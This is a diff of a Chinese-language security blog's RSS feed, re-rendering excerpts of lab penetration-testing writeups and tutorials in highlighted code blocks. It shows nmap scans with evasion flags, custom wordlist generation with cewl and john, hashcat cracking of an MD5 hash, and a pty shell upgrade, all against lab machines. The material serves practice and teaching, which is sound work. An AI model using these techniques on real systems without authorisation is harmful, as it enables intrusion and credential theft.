+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。&lt;/p&gt;</description></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
 &lt;h2 id="可能使用到的-cewl-及-john-命令及解释"&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h2&gt;
 &lt;h3 id="cewl-语句及其解释"&gt;Cewl 语句及其解释&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo cewl http://10.10.10.48 -w password.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令直接指定 &lt;em&gt;url&lt;/em&gt; 生成一个包含所有提取单词的字典文件，并保存为 &lt;em&gt;password.txt&lt;/em&gt; 文件。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo cewl -m 6 http://10.10.10.48 -w password.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 &lt;em&gt;-m 6&lt;/em&gt; 设置提取的单词长度最小为 &lt;em&gt;6&lt;/em&gt; 。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo cewl -d 2 http://10.10.10.48 -w password.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 -d 2 使 &lt;em&gt;Cewl&lt;/em&gt; 递归爬取网站内部链接，深度为 &lt;em&gt;2&lt;/em&gt; 。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo cewl -c http://10.10.10.48 -w password.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 &lt;em&gt;-c&lt;/em&gt; 去除重复单词，并显示单词出现的次数。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo cewl -e http://10.10.10.48 -w password.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令使用 -&lt;em&gt;e&lt;/em&gt; 保留所有发现的电子邮件地址。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl http://10.10.10.48 -w password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令直接指定 &lt;em&gt;url&lt;/em&gt; 生成一个包含所有提取单词的字典文件，并保存为 &lt;em&gt;password.txt&lt;/em&gt; 文件。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl -m &lt;span style="color:#ae81ff"&gt;6&lt;/span&gt; http://10.10.10.48 -w password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令使用 &lt;em&gt;-m 6&lt;/em&gt; 设置提取的单词长度最小为 &lt;em&gt;6&lt;/em&gt; 。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl -d &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt; http://10.10.10.48 -w password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令使用 -d 2 使 &lt;em&gt;Cewl&lt;/em&gt; 递归爬取网站内部链接，深度为 &lt;em&gt;2&lt;/em&gt; 。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl -c http://10.10.10.48 -w password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令使用 &lt;em&gt;-c&lt;/em&gt; 去除重复单词，并显示单词出现的次数。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo cewl -e http://10.10.10.48 -w password.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令使用 -&lt;em&gt;e&lt;/em&gt; 保留所有发现的电子邮件地址。&lt;/p&gt;
 &lt;h3 id="john-语法及其解释"&gt;john 语法及其解释&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo john --rules -wordlist=password.txt --stdout | sort | uniq &amp;gt; wordlist.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 &lt;em&gt;&amp;ndash;rules&lt;/em&gt; 指定内置密码规则生成新密码组合，&lt;em&gt;&amp;ndash;wordlist=password.txt&lt;/em&gt; 指定原始字典为 &lt;em&gt;passowrd.txt&lt;/em&gt; ，使用 &lt;em&gt;&amp;ndash;stdout&lt;/em&gt; 将生成的密码标准输出，&lt;em&gt;sort&lt;/em&gt; 对单词进行排序，&lt;em&gt;uniq&lt;/em&gt; 去重。&lt;/p&gt;</description></item><item><title>nmap 扫描原理与使用心得</title><link>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</link><pubDate>Wed, 24 Sep 2025 21:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</guid><description>&lt;blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo john --rules -wordlist&lt;span style="color:#f92672"&gt;=&lt;/span&gt;password.txt --stdout | sort | uniq &amp;gt; wordlist.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 &lt;em&gt;&amp;ndash;rules&lt;/em&gt; 指定内置密码规则生成新密码组合，&lt;em&gt;&amp;ndash;wordlist=password.txt&lt;/em&gt; 指定原始字典为 &lt;em&gt;passowrd.txt&lt;/em&gt; ，使用 &lt;em&gt;&amp;ndash;stdout&lt;/em&gt; 将生成的密码标准输出，&lt;em&gt;sort&lt;/em&gt; 对单词进行排序，&lt;em&gt;uniq&lt;/em&gt; 去重。&lt;/p&gt;</description></item><item><title>nmap 扫描原理与使用心得</title><link>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</link><pubDate>Wed, 24 Sep 2025 21:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;以下命令均以 kali本地地址为 10.10.10.5，靶机地址为 10.10.10.45 为案例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id="nmap-扫描原理解析"&gt;nmap 扫描原理解析&lt;/h2&gt;
@@ -314,58 +314,56 @@ Enter passphrase:
 &lt;p&gt;靶机ip：10.10.10.44&lt;/p&gt;
 &lt;h2 id="信息收集"&gt;信息收集&lt;/h2&gt;
 &lt;p&gt;使用 nmap 进行主机发现&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Lampiao%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Lampiao%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;10.10.10.44 是新发现的主机，为靶机 IP；使用 nmap 以最低 10000 的速率进行全端口扫描&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.44
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.44
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
 &lt;p&gt;一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P6.png" alt="P6"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P6.png" alt="P6"&gt;&lt;/p&gt;
 &lt;p&gt;可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p22,80,1898 10.10.10.44
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P7.png" alt="P7"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80,1898 10.10.10.44
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P7.png" alt="P7"&gt;&lt;/p&gt;
 &lt;p&gt;没有扫描出来可以利用的漏洞信息&lt;/p&gt;
 &lt;h2 id="web-渗透"&gt;Web 渗透&lt;/h2&gt;
-&lt;p&gt;访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息&lt;/p&gt;
-&lt;p&gt;&lt;img src="P8.png" alt="P8"&gt;&lt;/p&gt;
-&lt;p&gt;访问 1898 端口发现有一个登入界面，尝试常见弱口令没有进去&lt;/p&gt;</description></item><item><title>DeathStar Writeup</title><link>https://enilmalus.github.io/posts/deathstar-writeup/</link><pubDate>Tue, 24 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/deathstar-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;访问 80 端口，是一个字符串组成的图案，查看源码并没有发现更多信息&lt;/p&gt;</description></item><item><title>DeathStar Writeup</title><link>https://enilmalus.github.io/posts/deathstar-writeup/</link><pubDate>Tue, 24 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/deathstar-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="nmap-扫描"&gt;Nmap 扫描&lt;/h1&gt;
 &lt;h1 id="端口和服务识别"&gt;端口和服务识别&lt;/h1&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.20
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;未发现任何开放的端口&lt;/p&gt;
 &lt;h2 id="数据包分片扫描"&gt;数据包分片扫描&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -f --min-rate 10000 -p- 10.10.10.20
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -f --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
 &lt;p&gt;还是未发现任何开放的端口&lt;/p&gt;
 &lt;h2 id="源端口伪装扫描"&gt;源端口伪装扫描&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --source-port 53 --min-rate 10000 -p- 10.10.10.20 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --source-port &lt;span style="color:#ae81ff"&gt;53&lt;/span&gt; --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.20 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
 &lt;p&gt;还是未发现任何开放端口&lt;/p&gt;
 &lt;h2 id="随机端口顺序扫描"&gt;随机端口顺序扫描&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -r --min-rate 10000 -p- 10.10.10.20
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -r --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
 &lt;p&gt;还是未发现任何开放端口&lt;/p&gt;
 &lt;h2 id="tcp-windows-扫描"&gt;TCP Windows 扫描&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --scanflags URGPSHFIN --min-rate 10000 -p- 10.10.10.20 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P6.png" alt="P6"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --scanflags URGPSHFIN --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.20 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P6.png" alt="P6"&gt;&lt;/p&gt;
 &lt;p&gt;还是未发现任何开放的端口&lt;/p&gt;
 &lt;h2 id="慢速扫描"&gt;慢速扫描&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -T2 -p- 10.10.10.20
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;太慢了，无结果，暂时先跳过&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -T2 -p- 10.10.10.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;太慢了，无结果，暂时先跳过&lt;/p&gt;
 &lt;h1 id="流量分析"&gt;流量分析&lt;/h1&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;tshark -i eth0 -f &amp;#34;host 10.10.10.20&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P7.png" alt="P7"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tshark -i eth0 -f &lt;span style="color:#e6db74"&gt;&amp;#34;host 10.10.10.20&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P7.png" alt="P7"&gt;&lt;/p&gt;
 &lt;p&gt;捕捉流量&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;tshark -i eth0 -f &amp;#34;host 10.10.10.20&amp;#34; -w flu.pcap
-
-tshark -r flu.pcap
-
-tshark -r flu.pcap -V
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P8.png" alt="P8"&gt;&lt;/p&gt;</description></item><item><title>如何为靶机配置 DHCP</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E4%B8%BA%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE-dhcp/</link><pubDate>Tue, 10 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E4%B8%BA%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE-dhcp/</guid><description>&lt;blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tshark -i eth0 -f &lt;span style="color:#e6db74"&gt;&amp;#34;host 10.10.10.20&amp;#34;&lt;/span&gt; -w flu.pcap
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tshark -r flu.pcap
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tshark -r flu.pcap -V
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P8.png" alt="P8"&gt;&lt;/p&gt;</description></item><item><title>如何为靶机配置 DHCP</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E4%B8%BA%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE-dhcp/</link><pubDate>Tue, 10 Jun 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E4%B8%BA%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE-dhcp/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id="环境判断"&gt;环境判断&lt;/h2&gt;
@@ -383,20 +381,20 @@ tshark -r flu.pcap -V
 &lt;p&gt;&lt;img src="%E4%BF%AE%E6%94%B9%E5%89%8D.png" alt="修改前"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src="%E4%BF%AE%E6%94%B9%E5%90%8E.png" alt="修改后"&gt;&lt;/p&gt;
 &lt;p&gt;保存后执行网络重启命令后获得 ip&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;service networking restart
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97.png" alt="获得"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;service networking restart
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97.png" alt="获得"&gt;&lt;/p&gt;
 &lt;p&gt;回到 kali 中，重新获得 ip&lt;/p&gt;
 &lt;p&gt;&lt;img src="%E8%8E%B7%E5%BE%97ip.png" alt="获得ip.png"&gt;&lt;/p&gt;</description></item><item><title>Venom Writeup</title><link>https://enilmalus.github.io/posts/venom-writeup/</link><pubDate>Sat, 24 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/venom-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
 &lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
 &lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
-
-sudo nmap --min-rate 10000 -p- 10.10.10.31 
-
-sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
-
-sudo nmap --script=vuln -p22,80 10.10.10.31 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Venom%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Venom%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
 靶机还开放了 smb 服务，可进行更详细的 smb 扫描，&lt;/p&gt;
 &lt;p&gt;查看 80 端口，是 Ubuntu 的默认界面&lt;/p&gt;
@@ -405,30 +403,30 @@ sudo nmap --script=vuln -p22,80 10.10.10.31
 &lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
 &lt;p&gt;使用 hashcat 破解&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P9.png" alt="P9"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo hashcat -m &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; -a &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; Hash/md5.txt /usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P9.png" alt="P9"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src="P10.png" alt="P10"&gt;&lt;/p&gt;
 &lt;p&gt;使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;ftp 10.10.10.6
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P11.png" alt="P11"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ftp 10.10.10.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P11.png" alt="P11"&gt;&lt;/p&gt;
